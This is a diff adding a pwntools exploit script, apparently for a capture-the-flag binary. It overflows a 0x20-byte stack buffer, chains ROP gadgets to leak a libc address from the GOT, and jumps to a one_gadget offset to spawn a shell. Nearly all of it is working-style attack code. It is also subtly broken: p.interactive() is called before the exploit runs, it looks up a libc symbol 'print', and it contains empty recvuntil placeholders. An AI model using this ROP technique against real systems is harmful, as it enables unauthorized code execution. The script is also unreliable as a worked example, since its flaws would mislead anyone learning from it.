@@ -1,0 +1,118 @@
+from pwn import *
+
+# Set up pwntools context
+context.arch = 'amd64'
+context.os = 'linux'
+context.log_level = 'info'
+
+# Decide whether to use a local or remote target
+LOCAL = True
+BINARY = './vuln'
+
+if LOCAL:
+    p = process(BINARY)
+    p.interactive()
+    # Uncomment for debugging
+    # gdb.attach(p, '''
+    # break main
+    # continue
+    # ''')
+else:
+    # Fill in remote details when available
+    p = remote('host', 1337)
+
+
+
+# Load the binary for analysis
+elf = ELF(BINARY)
+libc = ELF('./libc.so.6')  # Use the provided libc
+
+# Find useful addresses from the binary
+main_addr = elf.symbols['main']
+
+# Constants from the binary analysis
+BUFFER_SIZE = 0x20  # From main function: [rbp-0x20]
+PRINT_ADDR = 0x404010  # Address of the print function pointer
+
+# Create helper function to create our ROP chains
+def create_rop_chain(rop_gadgets):
+    # Padding to reach the return address (buffer size + saved rbp)
+    padding = b'A' * BUFFER_SIZE + b'B' * 8
+    return padding + b''.join(p64(addr) for addr in rop_gadgets)
+
+# First stage: Leak libc address
+# Strategy: Use print to print the address of a libc function
+
+# Find necessary addresses
+print_got = 0x404010
+
+# We need gadgets to set up the arguments for print
+# From ROPgadget output, we don't have a direct pop rdi
+# But we can utilize some of the available gadgets
+
+# We'll use these gadgets:
+pop_rbp_gadget = 0x40115d  # pop rbp ; ret
+
+# For calling print, we need to control rdi
+# We'll leverage the existing code in main which calls print(buffer)
+# The gadget at 0x401218 does: lea rax, [rbp-0x20] ; mov rdi, rax ; call rdx
+lea_mov_call_gadget = 0x401218
+
+# Our approach:
+# 1. Set rbp to a value so that [rbp-0x20] points to print@GOT
+# 2. Return to main to get rdx set to print
+# 3. Use the lea/mov/call gadget to call print(print@GOT)
+
+# Stage 1: Leak print address
+rop1 = [
+    # Set up rbp so rbp-0x20 points to print@got
+    pop_rbp_gadget,
+    print_got + 0x20,  # rbp value, so that rbp-0x20 = print_got
+    
+    # Return to main, which will set rdx to print
+    main_addr,
+    
+    # After main returns, we'll hit our gadget
+    lea_mov_call_gadget  # This will effectively call print(print_got)
+]
+
+# Send the first payload
+# p.recvuntil(b'')  # Adjust based on program output
+first_payload = create_rop_chain(rop1)
+p.sendline(first_payload)
+
+# Receive the echo of our input from print(s) in main
+p.recvline()
+
+# Receive the leaked address of print
+leaked_print = u64(p.recvline().strip().ljust(8, b'\x00'))
+log.success(f"Leaked print address: {hex(leaked_print)}")
+
+# Calculate libc base
+libc_base = leaked_print - libc.symbols['print']
+log.info(f"Libc base: {hex(libc_base)}")
+
+# Using one_gadget approach instead of system("/bin/sh")
+# Based on one_gadget output for this libc
+one_gadget_offsets = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]  # From one_gadget analysis
+log.info(f"Using one_gadget technique with offsets: {[hex(o) for o in one_gadget_offsets]}")
+
+# Stage 2: Jump to one_gadget for direct shell
+# We'll try each one_gadget offset until one works
+# The offset 0xef4ce looks most promising based on constraints
+
+one_gadget_addr = libc_base + 0xef4ce  # Using the third gadget from one_gadget output
+
+rop2 = [
+    # Jump directly to one_gadget
+    one_gadget_addr
+]
+
+# Send the second payload
+p.recvuntil(b'')  # Adjust based on program output
+second_payload = create_rop_chain(rop2)
+p.sendline(second_payload)
+
+# Get interactive shell
+p.interactive()
+
